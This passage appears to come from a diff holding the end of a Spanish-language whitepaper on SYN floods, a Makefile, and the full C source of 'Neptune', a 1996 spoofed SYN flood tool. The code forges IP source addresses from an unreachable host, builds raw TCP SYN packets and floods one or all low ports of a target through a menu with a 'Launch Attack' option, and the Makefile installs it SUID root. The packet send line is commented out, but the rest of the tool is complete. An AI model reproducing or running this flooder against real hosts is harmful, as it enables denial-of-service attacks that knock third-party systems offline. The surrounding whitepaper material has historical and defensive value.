+- Cuando se reciben una cantidad x de SYN en un socket, se comparan 
+ciertas caracteristicas sobre los paquetes, (puerto origen, direccion IP
+origen, numeros de secuencia, tama¤o de ventana, etc) y si la cosa
+parece sospechosa, las peticiones de conexion y las estructuras de
+memoria asociadas son destruidas inmediatamente.
+
+                Seccion VIII.   Referencias
+
+
+
+		Ppl:	A. Cox, R. Stevens
+		Libros:	TCP Illustrated vols II,III
+		
+
+
+This project made possible by a grant from the Guild Corporation.
+
+EOF
+
+
+------------------------8<--------------------------------------------
+
+
+# Neptune Makefile
+# daemon9, 1996 Guild Productions
+
+all:
+	@gcc -o neptune neptune.c
+	@echo ""
+	@echo "'make install' will install the program..."
+	@echo ""
+	@echo "Warning!  Neptune is installed SUID root by default!"
+	@echo ""
+	@echo "route@infonexus.com / Guild Corporation"
+install:
+	strip ./neptune
+	mv ./neptune /usr/local/bin/neptune
+	chmod 4755 /usr/local/bin/neptune
+	@echo "root" > /etc/sfaccess.conf
+	@echo "Installation complete, access list is /etc/sfaccess.conf"
+clean: 
+	@rm -f *.o neptune /etc/sfaccess.conf
+
+
+------------------------8<--------------------------------------------
+
+
+/*
+			        Neptune
+			        v. 1.5
+
+			daemon9/route/infinity
+
+		      June 1996 Guild productions
+
+	             comments to daemon9@netcom.com
+	
+	If you found this code alone, without the companion whitepaper
+	please get the real-deal:
+ftp.infonexus.com/pub/SourceAndShell/Guild/Route/Projects/Neptune/neptune.tgz
+	
+Brief synopsis:
+	Floods the target host with TCP segments with the SYN bit on,
+	puportedly from an unreachable host.  The return address in the 
+	IP header is forged to be that of a known unreachable host.  The
+	attacked TCP, if flooded sufficently, will be unable to respond
+	to futher connects.  See the accompanying whitepaper for a full 
+	treatment of the topic.  (Also see my paper on IP-spoofing for
+	information on a related subject.)
+
+Usage:
+	Figure it out, kid.  Menu is default action.  Command line usage is
+	available for easy integration into shell scripts.  If you can't
+	figure out an unreachable host, the program will not work.
+
+Gripes: 
+	It would appear that flooding a host on every port (with the 
+	infinity switch) has it's drawbacks.  So many packets are trying to 
+	make their way to the target host, it seems as though many are 
+	dropped, especially on ethernets.  Across the Internet, though, the 
+	problem appears mostly mitigated.  The call to usleep appears to fix 
+	this...  Coming up is a port scanning option that will find open 
+	ports...
+
+Version History:
+6/17/96 beta1:	SYN flooding, Cmd line and crude menu, ICMP stuff broken
+6/20/96	beta2:	Better menu, improved SYN flooding, ICMP fixed... sorta
+6/21/96	beta3:	Better menu still, fixed SYN flood clogging problem
+		Fixed some name-lookup problems
+6/22/96	beta4:	Some loop optimization, ICMP socket stuff changed, ICMP
+		code fixed
+6/23/96 1.0:	First real version...
+6/25/96	1.1:	Cleaned up some stuff, added authentication hooks, fixed up
+		input routine stuff
+7/01/96	1.5:	Added daemonizing routine...
+
+   This coding project made possible by a grant from the Guild corporation
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <syslog.h>
+#include <pwd.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <fcntl.h>
+#include <time.h>
+#include <linux/signal.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <linux/icmp.h>
+
+#define BUFLEN 256
+#define MENUBUF	64
+#define MAXPORT 1024
+#define	MAXPAK 4096		
+#define	MENUSLEEP 700000 	
+#define	FLOODSLEEP 100		/* Ethernet, or WAN? Yur mileage will vary.*/
+#define	ICMPSLEEP 100		
+#define ACCESSLIST "/etc/sfaccess.conf"
+
+int HANDLERCODE=1;
+int KEEPQUIET=0;
+char werd[]={"\nThis code made possible by a grant from the Guild Corporation\n\0"};
+ 
+void main(argc,argv)
+int argc;
+char *argv[];
+{
+	
+	void usage(char *);
+	void menu(int,char *);
+	void flood(int,unsigned,unsigned,u_short,int);
+	unsigned nameResolve(char *);
+	int authenticate(int,char *);	
+ 
+	unsigned unreachable,target;	
+	int c,port,amount,sock1,fd;
+	struct passwd *passEnt;
+	char t[20],u[20];
+
+	if((fd=open(ACCESSLIST,O_RDONLY))<=0){
+		perror("Cannot open accesslist");
+		exit(1);
+	}
+	setpwent();
+	passEnt=getpwuid(getuid());
+	endpwent();
+				/* Authenticate */
+	if(!authenticate(fd,passEnt->pw_name)){
+		fprintf(stderr,"Access Denied, kid\n");
+		exit(0);
+	}
+				/* Open up a RAW socket */
+
+   	if((sock1=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0){
+   		perror("\nHmmm.... socket problems\n");
+      		exit(1);
+   	} 
+	if(argc==1){
+		menu(sock1,passEnt->pw_name);
+		exit(0);
+	}
+				/* Parse command-line arguments */
+	while((c=getopt(argc,argv,"8:s:t:p:a"))){
+      		switch(c){
+			case 's':	/* Source (spoofed) host */
+				unreachable=nameResolve(optarg);
+				strcpy(u,optarg);
+				break;
+			case 't':	/* Target host */
+			 	target=nameResolve(optarg);
+				strcpy(t,optarg);
+				break;
+			case 'p':	/* Target port */
+				port=atoi(optarg);
+				break;
+        		case '8':	/* infinity switch */
+				port=0;			
+				break;
+			case 'a':	/* Amount of SYNs to send */
+				amount=atoi(optarg);
+				break;
+        		default:	/* WTF? */
+          			usage(argv[0]);
+		}
+	}    
+
+	if(!port){
+		printf("\n\nFlooding target: \t\t%u\nOn ports\t\t\t1-%d\nAmount: \t\t\t%u\nPuportedly from: \t\t%u \n",target,MAXPORT,amount,unreachable); 
+	  	flood(sock1,unreachable,target,0,amount);
+	}	
+	else{
+		printf("\n\nFlooding target: \t\t%u\nOn port: \t\t\t%u\nAmount: \t\t\t%u\nPuportedly from: \t\t%u \n",target,port,amount,unreachable); 
+   		flood(sock1,unreachable,target,port,amount);
+	}
+	syslog(LOG_LOCAL6|LOG_INFO,"FLOOD: PID: %d, User:%s Target:%s Unreach:%s Port:%d Number:%d\n",getpid(),passEnt->pw_name,t,u,port,amount);  
+	printf(werd);
+	exit(0);
+}					/* End main */
+
+/*
+ * 	Authenticate.  Makes sure user is authorized to run program.
+ *
+ */
+int authenticate(fd,nameID)
+int fd;
+char *nameID;
+{
+
+	char buf[BUFLEN+1];
+	char workBuffer[10];
+	int i=0,j=0;	
+
+	while(read(fd,buf,sizeof(buf))){
+		if(!(strstr(buf,nameID))){
+			close(fd);
+			syslog(LOG_LOCAL6|LOG_INFO,"Failed authentication for %s\n",nameID);  
+			return(0);
+		}
+		else {
+			close(fd);
+			syslog(LOG_LOCAL6|LOG_INFO,"Successful start by %s, PID: %d\n",nameID,getpid());  
+			return(1);
+		}
+	}
+}
+
+
+/*
+ *	Flood.  This is main workhorse of the program.  IP and TCP header 
+ *	construction occurs here, as does flooding.	
+ */
+void flood(int sock,unsigned sadd,unsigned dadd,u_short dport,int amount){
+ 
+	unsigned short in_cksum(unsigned short *,int);
+  
+   	struct packet{
+      		struct iphdr ip;
+      		struct tcphdr tcp;
+   	}packet;
+   
+	struct pseudo_header{		/* For TCP header checksum */
+      		unsigned int source_address;
+      		unsigned int dest_address;
+      		unsigned char placeholder;
+      		unsigned char protocol;
+      		unsigned short tcp_length;
+      		struct tcphdr tcp;
+   	}pseudo_header;
+ 
+   	struct sockaddr_in sin;		/* IP address information */
+   	register int i=0,j=0;		/* Counters */
+	int tsunami=0;			/* flag */
+	unsigned short sport=161+getpid();
+
+	if(!dport){
+		tsunami++;		/* GOD save them... */
+		fprintf(stderr,"\nTSUNAMI!\n");
+		fprintf(stderr,"\nflooding port:");	
+	}
+
+   			/* Setup the sin struct with addressing information */
+
+   	sin.sin_family=AF_INET;		/* Internet address family */
+   	sin.sin_port=sport;		/* Source port */
+   	sin.sin_addr.s_addr=dadd;	/* Dest. address */
+    			
+			/* Packet assembly begins here */
+
+   				/* Fill in all the TCP header information */
+
+   	packet.tcp.source=sport;	/* 16-bit Source port number */
+   	packet.tcp.dest=htons(dport); 	/* 16-bit Destination port */
+   	packet.tcp.seq=49358353+getpid();	/* 32-bit Sequence Number */
+   	packet.tcp.ack_seq=0;		/* 32-bit Acknowledgement Number */
+   	packet.tcp.doff=5;		/* Data offset */
+	packet.tcp.res1=0;		/* reserved */
+	packet.tcp.res2=0;		/* reserved */	
+   	packet.tcp.urg=0;		/* Urgent offset valid flag */		
+   	packet.tcp.ack=0;		/* Acknowledgement field valid flag */
+   	packet.tcp.psh=0;		/* Push flag */
+   	packet.tcp.rst=0;		/* Reset flag */
+   	packet.tcp.syn=1;		/* Synchronize sequence numbers flag */
+   	packet.tcp.fin=0;		/* Finish sending flag */
+   	packet.tcp.window=htons(242); /* 16-bit Window size */
+   	packet.tcp.check=0;		/* 16-bit checksum (to be filled in below) */
+   	packet.tcp.urg_ptr=0;		/* 16-bit urgent offset */
+ 
+   				/* Fill in all the IP header information */
+   
+   	packet.ip.version=4;		/* 4-bit Version */
+	packet.ip.ihl=5;		/* 4-bit Header Length */
+   	packet.ip.tos=0;		/* 8-bit Type of service */
+   	packet.ip.tot_len=htons(40);	/* 16-bit Total length */
+   	packet.ip.id=getpid();		/* 16-bit ID field */
+   	packet.ip.frag_off=0;		/* 13-bit Fragment offset */
+   	packet.ip.ttl=255;		/* 8-bit Time To Live */
+   	packet.ip.protocol=IPPROTO_TCP; /* 8-bit Protocol */
+   	packet.ip.check=0;		/* 16-bit Header checksum (filled in below) */
+   	packet.ip.saddr=sadd;		/* 32-bit Source Address */
+   	packet.ip.daddr=dadd;		/* 32-bit Destination Address */
+ 
+			/* Psuedo-headers needed for TCP hdr checksum (they
+			do not change and do not need to be in the loop) */
+      		
+	pseudo_header.source_address=packet.ip.saddr;
+      	pseudo_header.dest_address=packet.ip.daddr;
+      	pseudo_header.placeholder=0;
+      	pseudo_header.protocol=IPPROTO_TCP;
+      	pseudo_header.tcp_length=htons(20);
+ 
+	while(1){			/* Main loop */
+		if(tsunami){
+			if(j==MAXPORT){
+				tsunami=0;
+	  			break;
+			}
+			packet.tcp.dest=htons(++j);
+			fprintf(stderr,"%d",j);
+			fprintf(stderr,"%c",0x08);
+			if(j>=10)fprintf(stderr,"%c",0x08);
+			if(j>=100)fprintf(stderr,"%c",0x08);
+			if(j>=1000)fprintf(stderr,"%c",0x08);
+			if(j>=10000)fprintf(stderr,"%c",0x08);
+
+		}
+   		for(i=0;i<amount;i++){	/* Flood loop */
+
+				/* Certian header fields should change */	
+
+      			packet.tcp.source++;	/* Source port inc */
+      			packet.tcp.seq++;	/* Sequence Number inc */
+      			packet.tcp.check=0;	/* Checksum will need to change */
+      			packet.ip.id++;		/* ID number */
+      			packet.ip.check=0;	/* Checksum will need to change */
+ 
+      			/* IP header checksum */
+      	
+			packet.ip.check=in_cksum((unsigned short *)&packet.ip,20);
+ 
+			/* Setup TCP headers for checksum */
+
+      			bcopy((char *)&packet.tcp,(char *)&pseudo_header.tcp,20);
+
+			/* TCP header checksum */
+
+      			packet.tcp.check=in_cksum((unsigned short *)&pseudo_header,32);
+
+			/* As it turns out, if we blast packets too fast, many
+		 	get dropped, as the receiving kernel can't cope (at 
+			least on an ethernet).  This value could be tweaked
+			prolly, but that's up to you for now... */
+		
+			usleep(FLOODSLEEP);  
+		
+		/* This is where we sit back and watch it all come together */
+      		
+			/*sendto(sock,&packet,40,0,(struct sockaddr *)&sin,sizeof(sin));*/
+			if(!tsunami&&!KEEPQUIET)fprintf(stderr,".");
+   		}	
+		if(!tsunami)break;
+	}
+}
+ 
+
+/*
+ *	IP Family checksum routine (from UNP)
+ */
+unsigned short in_cksum(unsigned short *ptr,int nbytes){
+
+	register long           sum;            /* assumes long == 32 bits */
+        u_short                 oddbyte;
+        register u_short        answer;         /* assumes u_short == 16 bits */
+ 
+        /*
+         * Our algorithm is simple, using a 32-bit accumulator (sum),
+         * we add sequential 16-bit words to it, and at the end, fold back
+         * all the carry bits from the top 16 bits into the lower 16 bits.
+         */
+ 
+        sum = 0;
+        while (nbytes > 1)  {
+                sum += *ptr++;
+                nbytes -= 2;
+        }
+ 
+                                /* mop up an odd byte, if necessary */
+        if (nbytes == 1) {
+                oddbyte = 0;            /* make sure top half is zero */
+                *((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
+                sum += oddbyte;
+        }
+ 
+        /*
+         * Add back carry outs from top 16 bits to low 16 bits.
+         */
+ 
+        sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
+        sum += (sum >> 16);                     /* add carry */
+        answer = ~sum;          /* ones-complement, then truncate to 16 bits */
+        return(answer);
+}
+
+
+/*
+ *	Converts IP addresses
+ */
+unsigned nameResolve(char *hostname){
+
+	struct in_addr addr;
+   	struct hostent *hostEnt;
+
+   	if((addr.s_addr=inet_addr(hostname))==-1){
+     		if(!(hostEnt=gethostbyname(hostname))){
+         		fprintf(stderr,"Name lookup failure: `%s`\n",hostname);
+         		exit(0);
+      		}
+      		bcopy(hostEnt->h_addr,(char *)&addr.s_addr,hostEnt->h_length);
+   	}
+   	return addr.s_addr;
+}
+
+
+/*
+ *	Menu function.  Nothing suprising here.  Except that one thing.
+ */
+void menu(sock1,nameID)
+int sock1;
+char *nameID;
+{
+	int slickPing(int,int,char *);
+	void flood(int,unsigned,unsigned,u_short,int);
+	unsigned nameResolve(char *);
+	void demon(int,char *,char *,int,int,int,int);
+
+	int i,sock2,menuLoop=1,icmpAmt,port,amount,interval,ttl;
+	char optflags[7]={0};		/* So we can keep track of the options */
+	static char tmp[MENUBUF+1]={0},target[MENUBUF+1]={0},unreach[MENUBUF+1]={0};	
+
+	while(menuLoop){		
+		printf("\n\n\t\t\t[   SYNflood Menu   ]\n\t\t\t    [  daemon9  ]\n\n");
+		if(!optflags[0])printf("1\t\tEnter target host\n");
+		else printf("[1]\t\tTarget:\t\t\t%s\n",target);
+		if(!optflags[1])printf("2\t\tEnter source (unreachable) host\n");
+		else printf("[2]\t\tUnreachable:\t\t%s\n",unreach);
+		if(!optflags[2])printf("3\t\tSend ICMP_ECHO(s) to unreachable\n");
+		else printf("[3]\t\tUnreachable host:\tverified unreachable\n");
+		if(!optflags[3])printf("4\t\tEnter port number to flood\n");
+		else if(port)printf("[4]\t\tFlooding:\t\t%d\n",port);
+		else printf("[4]\t\tFlooding:\t\t1-1024\n");
+		if(!optflags[4])printf("5\t\tEnter number of SYNs\n");
+		else printf("[5]\t\tNumber SYNs:\t\t%d\n",amount);
+		printf("\n6\t\tQuit\n");
+		if(optflags[0]&&optflags[1]&&optflags[3]&&optflags[4])printf("7\t\tLaunch Attack\n");
+		if(optflags[0]&&optflags[1]&&optflags[3]&&optflags[4])printf("8\t\tDaemonize\n");
+		printf("\n\n\n\n\n\n\n\n\n\n\n\n");
+		fgets(tmp,BUFLEN/2,stdin);	/* tempered input */
+		switch(atoi(tmp)){
+			case 1:	
+				printf("[hostname]-> ");
+				fgets(target,MENUBUF,stdin);
+				i=0;
+				if(target[0]=='\n')break;
+				while(target[i]!='\n')i++;
+				target[i]=0;
+				optflags[0]=1;			
+				break;
+			case 2:
+				printf("[hostname]-> ");
+				fgets(unreach,MENUBUF,stdin);
+				i=0;
+				if(unreach[0]=='\n')break;
+				while(unreach[i]!='\n')i++;
+				unreach[i]=0;
+				optflags[1]=1;
+				break;
+			case 3:
+				if(!optflags[1]){
+					fprintf(stderr,"Um, enter a host first\n");
+					usleep(MENUSLEEP);
+					break;
+				}
+						/* Raw ICMP socket */
+   				if((sock2=socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))<0){
+   					perror("\nHmmm.... socket problems\n");
+      					exit(1);
+   				}		
+				printf("[number of ICMP_ECHO's]-> ");
+				fgets(tmp,MENUBUF,stdin);
+				if(!(icmpAmt=atoi(tmp)))break;
+				if(slickPing(icmpAmt,sock2,unreach)){
+					fprintf(stderr,"Host is reachable... Pick a new one\n");
+					sleep(1);
+					optflags[1]=0;
+					optflags[2]=0;
+					HANDLERCODE=1;
+					close(sock2);
+					break;
+				}
+				optflags[2]=1;
+				close(sock2);
+				break;
+			case 4: 
+				printf("[port number]-> ");
+				fgets(tmp,MENUBUF,stdin);
+				port=atoi(tmp);
+				optflags[3]=1;
+				break;
+			case 5:
+				printf("[number of SYNs]-> ");
+				fgets(tmp,MENUBUF,stdin);
+				if(!(amount=atoi(tmp)))break;
+				optflags[4]=1;
+				break;
+			case 6:
+				menuLoop--;
+				break;
+			case 7:
+				if(optflags[0]&&optflags[1]&&optflags[3]&&optflags[4]){
+					syslog(LOG_LOCAL6|LOG_INFO,"FLOOD: PID: %d, User:%s Target:%s Unreach:%s Port:%d Number:%d\n",getpid(),nameID,target,unreach,port,amount);  
+					flood(sock1,nameResolve(unreach),nameResolve(target),port,amount);
+					menuLoop--;
+				}
+				else{
+					fprintf(stderr,"Illegal option --try again\n");
+					usleep(MENUSLEEP);
+				}
+				break;
+			case 8:
+				if(optflags[0]&&optflags[1]&&optflags[3]&&optflags[4]){
+					if(!port){
+						fprintf(stderr,"Cannot set infinity flag in daemon mode.  Sorry.\n");
+						usleep(MENUSLEEP*2);
+						break;
+					}
+					printf("[packet sending interval in seconds {80}]-> ");
+					fgets(tmp,MENUBUF,stdin);
+					if(!(interval=atoi(tmp)))interval=80;
+					printf("[time for daemon to live in whole hours(0=forever)]-> ");
+					fgets(tmp,MENUBUF,stdin);
+					ttl=atoi(tmp);
+					syslog(LOG_LOCAL6|LOG_INFO,"DFLOOD: PID: %d, User:%s Target:%s Unreach:%s Port:%d Number:%d Interval: %d TTL: %d\n",getpid(),nameID,target,unreach,port,amount,interval,ttl);  
+					demon(sock1,unreach,target,port,amount,interval,ttl);
+					exit(0);
+				}
+				else{
+					fprintf(stderr,"Illegal option --try again\n");
+					usleep(MENUSLEEP);
+				}
+				break;
+								
+			default:
+				fprintf(stderr,"Illegal option --try again\n");
+				usleep(MENUSLEEP);
+		}
+
+	}
+	printf("\n");
+	printf(werd);
+	return;
+}
+
+
+/*
+ *	SlickPing.  A quick and dirty ping hack.  Sends <amount> ICMP_ECHO 
+ *	packets and waits for a reply on any one of them...  It has to check 
+ *	to make sure the ICMP_ECHOREPLY is actually meant for us, as raw ICMP 
+ *	sockets get ALL the ICMP traffic on a host, and someone could be 
+ *	pinging some other host and we could get that ECHOREPLY and foul 
+ *	things up for us.
+ */
+int slickPing(amount,sock,dest)
+int amount,sock;
+char *dest;
+{
+
+	int alarmHandler();
+	unsigned nameResolve(char *);
+	
+	register int retcode,j=0;
+	struct icmphdr *icmp;
+	struct sockaddr_in sin;
+	unsigned char sendICMPpak[MAXPAK]={0};
+	unsigned short pakID=getpid()&0xffff;
+
+	struct ippkt{
+   		struct iphdr ip;
+   		struct icmphdr icmp;
+   		char buffer[MAXPAK];
+	}pkt;
+
+	bzero((char *)&sin,sizeof(sin));
+	sin.sin_family=AF_INET;
+	sin.sin_addr.s_addr=nameResolve(dest);
+
+		/* ICMP Packet assembly  */
+	/* We let the kernel create our IP header as it is legit */
+
+	icmp=(struct icmphdr *)sendICMPpak;
+	icmp->type=ICMP_ECHO;			/* Requesting an Echo */
+	icmp->code=0;				/* 0 for ICMP ECHO/ECHO_REPLY */
+	icmp->un.echo.id=pakID;			/* To identify upon return */	
+	icmp->un.echo.sequence=0;		/* Not used for us */
+	icmp->checksum=in_cksum((unsigned short *)icmp,64);
+
+	fprintf(stderr,"sending ICMP_ECHO packets: ");
+	for(;j<amount;j++){
+		usleep(ICMPSLEEP);		/* For good measure */
+		retcode=sendto(sock,sendICMPpak,64,0,(struct sockaddr *)&sin,sizeof(sin));
+		if(retcode<0||retcode!=64)
+			if(retcode<0){
+				perror("ICMP sendto err");
+				exit(1);
+			}
+			else fprintf(stderr,"Only wrote %d bytes",retcode);
+		else fprintf(stderr,".");
+	}
+	HANDLERCODE=1;
+	signal(SIGALRM,alarmHandler);	/* catch the ALARM and handle it */
+	fprintf(stderr,"\nSetting alarm timeout for 10 seconds...\n");
+	alarm(10);	/* ALARM is set b/c read() will block forever if no */
+	while(1){	/* packets arrive...   (which is what we want....)  */
+		read(sock,(struct ippkt *)&pkt,MAXPAK-1);
+  		if(pkt.icmp.type==ICMP_ECHOREPLY&&icmp->un.echo.id==pakID){
+			if(!HANDLERCODE)return(0);
+			return(1);
+		}
+  	}	
+}
+
+
+/* 
+ *	SIGALRM signal handler.  Souper simple.
+ */ 
+int alarmHandler(){
+
+	HANDLERCODE=0;		/* shame on me for using global vars */
+	alarm(0);
+	signal(SIGALRM,SIG_DFL);
+	return(0);
+}
+
+
+/*
+ *	Usage function...  
+ */
+void usage(nomenclature)
+char *nomenclature;
+{
+	fprintf(stderr,"\n\nUSAGE: %s \n\t-s unreachable_host \n\t-t target_host \n\t-p port [-8 (infinity switch)] \n\t-a amount_of_SYNs\n",nomenclature);
+      	exit(0);
+}
+
+
+/*
+ *	Demon.  Backgrounding procedure and looping stuff.  
+ */					
+
+void demon(sock,unreachable,target,port,amount,interval,ttl)
+int sock;
+char *unreachable;
+char *target;
+int port;
+int amount;
+int interval;
+int ttl;
+{
+	fprintf(stderr,"\nSorry Daemon mode not available in this version\n");
+	exit(0);
+
+}
+	
